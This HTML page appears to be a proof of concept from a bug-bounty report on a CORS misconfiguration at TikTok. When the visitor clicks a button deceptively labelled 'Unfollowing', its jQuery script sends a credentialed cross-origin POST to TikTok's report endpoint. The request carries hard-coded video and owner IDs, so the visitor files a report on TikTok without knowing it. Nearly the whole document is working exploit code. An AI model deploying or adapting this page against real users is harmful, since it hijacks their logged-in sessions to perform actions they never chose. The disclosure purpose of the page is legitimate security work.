<!DOCTYPE html>
<html>
<head>
<script src=../../jquery-3.4.1.min.js></script>
</head>
<title>The abuse of report feature to the video or comment by misconfig of CORS-tiktok</title>
<div>
Hi there,this is a POC for tiktok.
<a href="https://www.tiktok.com/node/share/user/@user1017295554868?lang=en">The attacker share information,you can change the name if you want to get the userId</a>


<h3>Abuse of report to user's video（reporting to my test video with other reason）</h3>
<button id="report" onclick="report()">Unfollowing</button>
The result of reporting. 
<textarea id="result" style="width: 200px; height: 150px;"></textarea>
</div>
<script>
	
	
	
	function report(){
		var data = {};
		data["reason"] = "111";
		data["object_id"] = "6885621295845772545";
		data["owner_id"] = "75398519921";
		data["75398519921"] = "video";
		$.ajax({
			    url : 'https://www.tiktok.com/node/report/reasons_put?aid=1988&app_name=tiktok_web&device_platform=web&referer=&user_agent=Mozilla%2F5.0+(Windows+NT+6.1%3B+Win64%3B+x64%3B+rv:81.0)+Gecko%2F20100101+Firefox%2F81.0&cookie_enabled=true&screen_width=1920&screen_height=1080&browser_language=zh-CN&browser_platform=Win32&browser_name=Mozilla&browser_version=5.0+(Windows)&browser_online=true&ac=&timezone_name=Etc%2FGMT-8&page_referer=https:%2F%2Fwww.tiktok.com%2F@user2621822501116%3Flang%3Den&priority_region=&appId=1180&region=KR&appType=t&isAndroid=false&isMobile=false&isIOS=false&OS=windows&did=6885647817369519617&verifyFp=verify_kghtttjw_OVZcNuGX_du7l_49zD_A8wy_CFAhIFK160S4',
			    type : 'POST',
			    dataType:'json',
			    contentType:'application/json',
			    data:JSON.stringify(data),
			    xhrFields: {
			     withCredentials: true
			 },
			    success : function(data) {
				         alert("Reporting success!");
				         $("#result").val(data);
			    },
			    error : function(jqXHR, textStatus, errorThrown) {
				console.log("The error occured: " + textStatus, errorThrown);
			    },
			    complete : function() {
				       console.log("complete");
			    }
        });
	}
	
</script>
<a href="https://hackerone.com/johnstone">hacker1 johnstone</a>
</html>
